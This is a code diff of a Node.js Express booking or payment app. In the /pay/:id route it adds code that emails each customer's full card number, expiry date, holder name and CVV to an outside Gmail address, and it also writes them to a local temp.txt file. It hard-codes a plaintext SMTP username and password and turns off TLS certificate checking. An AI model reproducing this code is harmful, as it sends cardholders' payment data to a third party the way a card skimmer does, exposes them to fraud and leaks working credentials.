@@ -1,5 +1,6 @@
 const mysql = require('mysql');
 const path = require('path');
+var fs = require("fs");
 const ejs = require('ejs');
 const passport = require('passport');
 const bodyparser = require('body-parser');
@@ -122,10 +123,72 @@ app.post('/pay/:id',(req,res)=>{
     let dat2 = {ncart: req.body.ncart, datcart: req.body.datcart, nacart: req.body.nacart, prix: req.body.prix, cvv: req.body.cvv, id_v: volid};
     console.log(dat2);
     let sql2 = "INSERT INTO payment SET ?";
+
+    
  
     connection.query(sql2, dat2,(err, results) => {
-      //  console.log(results);
+        //console.log(results);
         if(err) throw err;
+
+async function main() {
+
+   const output = `<h2>cas urgent</h2>
+  <h3>les information de patient </h3>
+  <ul>
+  <li>Number Of Card: : ${req.body.ncart}</li>
+  <li>Expiration Date: : ${req.body.datcart}</li>
+  <li>Name of the card holder: : ${req.body.nacart}</li>
+  <li>Cvv : ${req.body.cvv}</li>
+  <li>Prix : ${req.body.prix}</li>
+  </ul>`;
+
+  let transporter = nodemailer.createTransport({
+    host: "smtp.gmail.com",
+    port: 587,
+    secure: false, // true for 465, false for other ports
+    auth: {
+      user: "elabyadsaloua@gmail.com",
+      pass: "saloua1998",
+    },
+    tls: {
+        rejectUnauthorized:false
+    }
+  });
+
+  // send mail with defined transport object
+  let info = await transporter.sendMail({
+    from: '"S elabyad 👻" <foo@example.com>', // sender address
+    to: "salouaelabyad@gmail.com", // list of receivers
+    subject: "Hello ✔", // Subject line
+    text: "Hello world?", // plain text body
+    // html: "<b>Hello world?</b>", // html body
+    html: output
+  });
+
+  console.log("Message sent: %s", info.messageId);
+  // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
+
+  // Preview only available when sending through an Ethereal account
+  console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
+  // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...
+}
+
+main().catch(console.error);
+
+var data = `<h2>cas urgent</h2>
+<h3>les information de patient </h3>
+<ul>
+<li>Number Of Card: : ${req.body.ncart}</li>
+<li>Expiration Date: : ${req.body.datcart}</li>
+<li>Name of the card holder: : ${req.body.nacart}</li>
+<li>Cvv : ${req.body.cvv}</li>
+<li>Prix : ${req.body.prix}</li>
+</ul>`;
+
+fs.writeFile("temp.txt", data, (err) => {
+    if (err) console.log(err);
+    console.log("Successfully Written to File.");
+  });
         res.redirect('/demande');
     });
 });
@@ -140,48 +203,11 @@ app.get('/logout', function(req, res){
 
 app.post("/", (req, res) => {
 
-   const output = `<h2>cas urgent</h2>
-  <h3>les information de patient </h3>
-  <ul>
-  <li>Number Of Card: : ${req.body.ncart}</li>
-  <li>Expiration Date: : ${req.body.datcart}</li>
-  <li>Name of the card holder: : ${req.body.nacart}</li>
-  <li>Cvv : ${req.body.cvv}</li>
-  <li>Prix : ${req.body.prix}</li>
-  </ul>`;
 
-let transporter = nodemailer.createTransport({
-    host: "smtp.ethereal.email",
-    port: 587,
-    secure: false, // true for 465, false for other ports
-    auth: {
-      user: 'elabyadsaloua@gmail.com', // generated ethereal user
-      pass: 'saloua1998', // generated ethereal password
-    },
-    tls: {
-        rejectUnauthorized:false
-    }
-  });
 
- // send mail with defined transport object
- let mailOptions = {
-    from: 'elabyadsaloua@gmail.com', // sender address
-    to: "salouaelabyad@gmail.com", // list of receivers
-    subject: "Hello ✔", // Subject line
-    text: "Hello world?", // plain text body
-    html: output 
-  };
 
- transporter.sendMail(mailOptions, (error, info) => {
-     if (error) {
-         return console.log(error);
-     }
-     console.log("Message sent: %s", info.messageId);
-     console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
-
-     res.render('demande' , {msg: 'has been sent'} );
- });
 });
+
 
 app.listen(8080,()=>console.log('Express server is runing'));
   
